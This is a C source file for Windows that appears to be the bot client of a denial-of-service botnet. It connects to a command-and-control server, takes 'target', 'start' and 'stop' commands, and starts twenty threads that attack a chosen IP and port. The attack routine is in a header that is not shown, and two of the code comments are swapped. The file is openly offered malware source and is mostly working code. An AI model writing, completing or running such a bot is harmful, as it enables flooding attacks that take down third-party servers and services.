#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <winuser.h>
#include "utils.h"

#define TARGET_IP ""        // control server IP here
#define SERVER_IP "127.0.0.1"        // target IP here
#define NUM_THREADS 20

volatile int running = 0;
HANDLE attack_threads [NUM_THREADS];

int main() {

    char cmd_buf[1024];
    char cmd_buf_copy[1024];

    // server socket details and setup
    SOCKET server_socket;
    struct sockaddr_in serv_addr;
    WSADATA wsaData;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(8080);
    const char* server_ip = SERVER_IP;

    // target socket details and setup
    struct address target_addr;
    target_addr.ip = TARGET_IP;
    target_addr.port = 80;

    // setting up connection to server
    // if the server isn't up yet, then it will keey trying to connect until it's successful
    startWinsock(&wsaData);
    server_socket = startSocket();
    while (connectSocket(&serv_addr, server_socket, server_ip) != 1){
        printf("Waiting for connection...");
        Sleep(1000);
    }

    while (1) {
        memset(cmd_buf, 0, 1024);
        printf("Waiting for command...\n");
        receiveCommand(server_socket, cmd_buf);
        printf("Command received: %s \n", cmd_buf);
        char** cmd_args = split(cmd_buf, ' ');
        char* cmd_arg1 = cmd_args[0];

        if (strcmp(cmd_arg1, "target") == 0){
            char** target = split(cmd_args[1], ':');
            target_addr.ip = target[0];
            target_addr.port = atoi(target[1]);
            printf("Target has been set to %s:%i ", target_addr.ip, target_addr.port);
        }
        else if (strcmp(cmd_arg1, "start") == 0){
            printf("Executing attack...\n");
            running = 1;
            for (int i=0; i<NUM_THREADS; i++){
                attack_threads[i] = CreateThread(NULL, 0, attack, (LPVOID)&target_addr, 0, NULL);
                // printf("Thread created");
                if (attack_threads[i] == NULL){
                    printf("error creating thread \n");
                }
            }
        } else if (strcmp(cmd_arg1, "stop") == 0){
            running = 0;
            printf("Stopping attack...\n");
            WaitForMultipleObjects(NUM_THREADS, attack_threads, TRUE, 10000);
            for (int i=0; i<NUM_THREADS; i++){
                CloseHandle(attack_threads[i]);
            }
            // closeSocket(server_socket);
            // break;
        }
    }

    return 0;
}
